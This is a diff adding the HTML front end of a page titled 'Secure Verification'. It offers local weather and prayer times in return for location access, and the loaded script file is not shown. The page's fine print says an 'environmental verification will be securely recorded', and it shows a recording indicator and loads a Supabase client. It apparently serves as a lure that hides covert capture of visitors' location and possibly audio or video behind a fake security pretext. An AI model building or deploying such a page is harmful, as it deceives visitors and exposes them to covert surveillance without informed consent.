@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location & Secure Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <h1>Secure Verification</h1>
+        <p class="subtitle">Weather & Local Information</p>
+    </header>
+
+    <div class="content">
+        <div id="intro-text">
+            <p class="description">
+                To personalize your experience, please allow access to your location. We will display the current weather and daily prayer times for your area. 
+                <br><br>
+                <small><em>Note: A brief environmental verification will be securely recorded to ensure session integrity.</em></small>
+            </p>
+            <button id="actionBtn">Allow Access & Start</button>
+        </div>
+
+        <div id="loading" style="display: none;">
+            <p>Gathering data and verifying environment...</p>
+        </div>
+
+        <div id="info">
+            <h3 class="info-title">Your Local Dashboard</h3>
+            <div id="location" class="info-card"></div>
+            <div id="weather" class="info-card"></div>
+            <div id="prayer-times" class="info-card prayer-container"></div>
+            
+            <div class="verification-badge">
+                <span class="recording-dot"></span> Verification Active
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="javas.js"></script>
+</body>
+</html>
